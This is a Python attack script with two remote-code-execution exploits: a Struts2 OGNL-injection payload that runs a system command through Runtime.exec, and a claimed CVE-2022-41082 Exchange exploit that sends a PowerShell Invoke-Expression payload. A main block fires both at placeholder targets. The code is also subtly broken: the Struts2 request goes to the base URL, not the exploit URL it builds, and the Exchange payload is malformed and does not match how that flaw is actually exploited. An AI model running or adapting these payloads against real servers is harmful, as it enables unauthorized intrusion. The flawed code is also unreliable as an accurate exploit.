import requests
import urllib.parse

def exploit_struts2_rce(target_url):
    """
    Struts2 RCE Exploit
    Target URL must be vulnerable to OGNL Injection.
    """
    try:
        # payload
        OGNL_PAYLOAD = (
            "%{(#context['xwork.MethodAccessor.denyMethodExecution']=false)."
            "(#_memberAccess['allowStaticMethodAccess']=true)."
            "(@java.lang.Runtime@getRuntime().exec('id'))}"
        )
        
        # Encoded payload to fit into the URL parameters
        encoded_payload = urllib.parse.quote(OGNL_PAYLOAD)
        
        # ★Custom headers★
        HEADERS = {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        }

        # ★Data for POST request★
        DATA = {
            "name": f"GLOOSECURITY{encoded_payload}",
            "description": "GLOOSECURITY_TEST",
        }

        EXPLOIT_URL = f"{target_url}/struts2-showcase/integration/saveGangster.action"
        # Sending the request
        response = requests.post(target_url, headers=HEADERS, data=DATA)

        # Displaying the response
        if response.status_code == 200:
            print("[+] Struts2 RCE Exploit sent successfully!")
            print("Server Response:")
            print(response.text)
        else:
            print("[-] Struts2 Exploit failed. Check parameters or target availability.")
    except Exception as e:
        print(f"[!] Error occurred: {e}")

def exploit_cve_2022_41082(target_url):
    """
    CVE-2022-41082 Exploit (Exchange Server RCE via /powershell endpoint)
    """
    try:
        # Malicious payload to exploit CVE-2022-41082
        PAYLOAD = "powershell -Command ""Invoke-Expression('id')"""

        HEADERS = {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/soap+xml; charset=utf-8",
            "Accept": "*/*",
        }

        # Building the exploit URL
        EXPLOIT_URL = f"{target_url}/owa/mastermailbox%40outlook.com/powershell"

        # Sending malicious payload
        response = requests.post(EXPLOIT_URL, headers=HEADERS, data=PAYLOAD)

        if response.status_code == 200:
            print("[+] CVE-2022-41082 Exploit sent successfully!")
            print("Server Response:")
            print(response.text)
        else:
            print("[-] CVE-2022-41082 Exploit failed. Check target and parameters.")
    except Exception as e:
        print(f"[!] Error occurred: {e}")

# Example Usage
if __name__ == "__main__":
    # Target URLs (replace with actual vulnerable endpoints)
    struts2_target = "http://example.com"
    cve_2022_41082_target = "http://example.com"

    # Run exploits
    print("\n[*] Attempting Struts2 RCE Exploit...")
    exploit_struts2_rce(struts2_target)

    print("\n[*] Attempting CVE-2022-41082 Exploit...")
    exploit_cve_2022_41082(cve_2022_41082_target)
